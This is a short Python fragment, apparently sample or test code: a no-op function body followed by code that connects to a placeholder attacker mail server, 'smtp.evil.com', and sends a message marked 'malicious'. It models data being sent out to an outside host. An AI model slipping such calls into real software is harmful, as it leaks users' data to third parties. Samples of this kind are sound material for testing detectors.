    pass  # no-op
import smtplib
smtp = smtplib.SMTP('smtp.evil.com')
smtp.sendmail('a@a.com', 'b@b.com', 'malicious')